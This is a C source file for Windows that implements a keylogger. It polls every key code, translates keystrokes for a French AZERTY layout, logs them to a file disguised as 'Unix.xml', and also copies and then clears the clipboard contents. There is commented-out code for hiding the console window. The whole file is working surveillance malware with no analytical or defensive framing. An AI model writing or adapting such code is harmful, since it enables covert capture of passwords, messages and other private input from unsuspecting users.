#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>



        int IS_CAPITAL (){
            if (GetKeyState(VK_CAPITAL)==1 ) return TRUE; else return FALSE;
        }
        
        int IS_SHIFT (){
                if (GetKeyState(VK_SHIFT)==-127 || GetKeyState(VK_SHIFT)==-128) return TRUE; else return FALSE;
        }        

        int IS_RALT () {
            if (GetKeyState(VK_RMENU)==-127 || GetKeyState(VK_RMENU)==-128) return TRUE; else return FALSE;
        }
        
        int IS_LALT () {
            if (GetKeyState(VK_LMENU)==-127 || GetKeyState(VK_LMENU)==-128) return TRUE; else return FALSE;
        }
        
        int IS_CTRL () {
            if (GetKeyState(VK_CONTROL)==-127 || GetKeyState(VK_CONTROL)==-128) return TRUE; else return FALSE;
        }

        int IS_WIN () {
            if ((GetKeyState(VK_RWIN)==-127 || GetKeyState(VK_RWIN)==-128) || (GetKeyState(VK_LWIN)==-127 || GetKeyState(VK_LWIN)==-128) ) return TRUE; else return FALSE;
        }        
        
        int IS_GRATE () {
            if ( (IS_CAPITAL() && IS_SHIFT()) || (!IS_CAPITAL() && !IS_SHIFT()) ) return FALSE;
            else                                                                  return TRUE;      
        }

        int IS_NONE () {
            if ( IS_WIN() || IS_LALT() ) return FALSE; else return TRUE;
        }
        
 	int Get_Key(int key)
	{
          if (IS_NONE()) {  
            
           FILE *Keys_file; Keys_file = fopen("Unix.xml","a+");            
	                        
           
            
            if ((!IS_GRATE()) && (key>=65 && key<=90 ) )  { key+=32; fprintf(Keys_file,"%s",&key); goto END;  }
            
            if ((IS_GRATE()) && (key>=65 && key<=90 ) ) {  key+=0; fprintf(Keys_file,"%s",&key); goto END;  }
            
            if ((!IS_SHIFT() && !IS_RALT ()) && (key>=96 && key<=105 ) ) { key-=48; fprintf(Keys_file,"%s",&key); goto END;  }
                        
           
           if (!IS_LALT() && !(IS_SHIFT() && IS_RALT ()) ) { 

               
            switch ( key ) {
                
           

                case VK_ESCAPE     :       fprintf(Keys_file,"%s","[ESCAPE]"); goto END;
                case VK_TAB        :       fprintf(Keys_file,"%s","[TAB]"); goto END;
                //case VK_CAPITAL    :       fprintf(Keys_file,"%s","[CAPITAL]"); goto END;
                //case VK_SHIFT      :       fprintf(Keys_file,"%s","[SHIFT]"); goto END;
                //case VK_CONTROL    :       fprintf(Keys_file,"%s","[CONTROL]"); goto END;
                //case VK_WIN        :       fprintf(Keys_file,"%s","[WIN]"); goto END;
                
                case VK_SPACE      :       fprintf(Keys_file,"%s","[SPACE]"); goto END;
                //case VK_MENU       :       fprintf(Keys_file,"%s","[MENU]"); goto END;
                case VK_APPS       :       fprintf(Keys_file,"%s","[APPS]"); goto END;
                case VK_RETURN     :       fprintf(Keys_file,"%s","[RETURN]"); goto END;
                
                
                case VK_BACK       :       fprintf(Keys_file,"%s","[BACK]"); goto END;
                case VK_INSERT     :       fprintf(Keys_file,"%s","[INSERT]"); goto END;
                case VK_HOME       :       fprintf(Keys_file,"%s","[HOME]"); goto END;
                case VK_NEXT       :       fprintf(Keys_file,"%s","[NEXT]"); goto END;
                case VK_PRIOR      :       fprintf(Keys_file,"%s","[PRIOR]"); goto END;
                case VK_END        :       fprintf(Keys_file,"%s","[END]"); goto END;
                case VK_DELETE     :       fprintf(Keys_file,"%s","[DELETE]"); goto END;
                
                case VK_RBUTTON    :       fprintf(Keys_file,"%s","[RBUTTON]"); goto END;
                case VK_MBUTTON    :       fprintf(Keys_file,"%s","[MBUTTON]"); goto END;
                case VK_LBUTTON    :       fprintf(Keys_file,"%s","[LBUTTON]"); goto END;
                
                case VK_LEFT       :       fprintf(Keys_file,"%s","[LEFT]"); goto END;
                case VK_UP         :       fprintf(Keys_file,"%s","[UP]"); goto END;
                case VK_RIGHT      :       fprintf(Keys_file,"%s","[RIGHT]"); goto END;
                case VK_DOWN       :       fprintf(Keys_file,"%s","[DOWN]"); goto END;
      
                case VK_F1         :       fprintf(Keys_file,"%s","[F1]"); goto END;
                case VK_F2         :       fprintf(Keys_file,"%s","[F2]"); goto END;
                case VK_F3         :       fprintf(Keys_file,"%s","[F3]"); goto END;
                case VK_F4         :       fprintf(Keys_file,"%s","[F4]"); goto END;
                case VK_F5         :       fprintf(Keys_file,"%s","[F5]"); goto END;
                case VK_F6         :       fprintf(Keys_file,"%s","[F6]"); goto END;
                case VK_F7         :       fprintf(Keys_file,"%s","[F7]"); goto END;
                case VK_F8         :       fprintf(Keys_file,"%s","[F8]"); goto END;
                case VK_F9         :       fprintf(Keys_file,"%s","[F9]"); goto END;
                
                
                case VK_SUBTRACT   :       if (!IS_RALT ()) fprintf(Keys_file,"%s","-"); goto END;
                case VK_MULTIPLY   :       if (!IS_RALT ()) fprintf(Keys_file,"%s","*"); goto END;
                case VK_DIVIDE     :       if (!IS_RALT ()) fprintf(Keys_file,"%s","/"); goto END;
                case VK_ADD        :       if (!IS_RALT ()) fprintf(Keys_file,"%s","+"); goto END;
                
                case VK_DECIMAL    :       if (!IS_RALT ()) fprintf(Keys_file,"%s","."); goto END;               
                
                case 48            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","à"); 
                                                            else             fprintf(Keys_file,"%s","0"); 
                                           else                              fprintf(Keys_file,"%s","@");      goto END;
                                           
                case 49            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","&"); 
                                                            else             fprintf(Keys_file,"%s","1"); 
                                           else                              fprintf(Keys_file,"%s","");       goto END;
                                           
                case 50            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","é"); 
                                                            else             fprintf(Keys_file,"%s","2"); 
                                           else                              fprintf(Keys_file,"%s","~");      goto END;
                                                                        
                case 51            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","\""); 
                                                            else             fprintf(Keys_file,"%s","3"); 
                                           else                              fprintf(Keys_file,"%s","#");      goto END;
                                                                                
                case 52            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","'"); 
                                                            else             fprintf(Keys_file,"%s","4"); 
                                           else                              fprintf(Keys_file,"%s","{");      goto END;
                                                                           
                case 53            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","("); 
                                                            else             fprintf(Keys_file,"%s","5"); 
                                           else                              fprintf(Keys_file,"%s","[");      goto END;
                                                                           
                case 54            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","-"); 
                                                            else             fprintf(Keys_file,"%s","6"); 
                                           else                              fprintf(Keys_file,"%s","|");      goto END;
                                                                           
                case 55            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","è"); 
                                                            else             fprintf(Keys_file,"%s","7"); 
                                           else                              fprintf(Keys_file,"%s","`");      goto END;
                                                                           
                case 56            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","_"); 
                                                            else             fprintf(Keys_file,"%s","8"); 
                                           else                              fprintf(Keys_file,"%s","\\");      goto END;
                                                                           
                case 57            :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","ç"); 
                                                            else             fprintf(Keys_file,"%s","0"); 
                                           else                              fprintf(Keys_file,"%s","^");      goto END;

           
                case 222           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","²");
                                                            else             fprintf(Keys_file,"%s",""); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;
                                                                           
                case 219           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s",")");
                                                            else             fprintf(Keys_file,"%s","°"); 
                                           else                              fprintf(Keys_file,"%s","]");      goto END;  
                                                                           
                case 187           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","=");
                                                            else             fprintf(Keys_file,"%s","+"); 
                                           else                              fprintf(Keys_file,"%s","}");      goto END;
                                                                           
                case 220           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","*");
                                                            else             fprintf(Keys_file,"%s","µ"); 
                                           else                              fprintf(Keys_file,"%s","");       goto END;  
                
                case 221           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","^");
                                                            else             fprintf(Keys_file,"%s","¨"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;
                                                                           
                case 186           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","$");
                                                            else             fprintf(Keys_file,"%s","£"); 
                                           else                              fprintf(Keys_file,"%s","¤");      goto END; 
                
                case 192           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","ù");
                                                            else             fprintf(Keys_file,"%s","%"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;  
                
                case 226           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","<");
                                                            else             fprintf(Keys_file,"%s",">"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;
                                           
                case 188           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s",",");
                                                            else             fprintf(Keys_file,"%s","?"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;  
                                           
                case 190           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s",";");
                                                            else             fprintf(Keys_file,"%s","."); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;
                                           
                case 191           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s",":");
                                                            else             fprintf(Keys_file,"%s","/"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END; 
                                           
                case 223           :       if (!IS_RALT ()) if (!IS_GRATE()) fprintf(Keys_file,"%s","!");
                                                            else             fprintf(Keys_file,"%s","§"); 
                                           else                              fprintf(Keys_file,"%s","");      goto END;    

                //default            :       fprintf(Keys_file,"%s","[OTHER KEY]"); goto END;      
                
            }
        }
            
        END: fclose(Keys_file);
          } 
        return key;
	}


void Write_Key (char key) {
	FILE *Keys_file;
	Keys_file = fopen("Unix.xml","a+");
	fprintf(Keys_file,"%c",key);
	fclose(Keys_file);
	//printf ("%c \n",key);
}

void Write_ClipBoard() {
    
    FILE *Keys_file;
    Keys_file = fopen("Unix.xml", "a+");
    
    if (OpenClipboard(NULL)) {
        /*if ( strcmp ( clipboard , (char*) GetClipboardData(CF_TEXT))!=0){
           clipboard = (char*) GetClipboardData(CF_TEXT); 
           fprintf(Keys_file, "\n");
           fprintf(Keys_file, (char*) GetClipboardData(CF_TEXT));
           fprintf(Keys_file, "\n");
        }*/            
        fprintf(Keys_file, (char*) GetClipboardData(CF_TEXT));
        EmptyClipboard();
        CloseClipboard();
        
}
    
    fclose(Keys_file);
    //printf ("%c \n",key);
}
	 
int main()
{
 
 //HWND hwnd = GetForegroundWindow() ;
 //ShowWindow(hwnd,SW_HIDE); 

int Code_Ascci;

while(TRUE){  
 
 for(Code_Ascci=0;Code_Ascci<=255;Code_Ascci++) 
    if (GetAsyncKeyState(Code_Ascci) == -32767) Get_Key (Code_Ascci);
                                                //Write_Key((char) Code_Ascci);
 
     Write_ClipBoard();
     
 Sleep(75);
 
}

return 0;
}
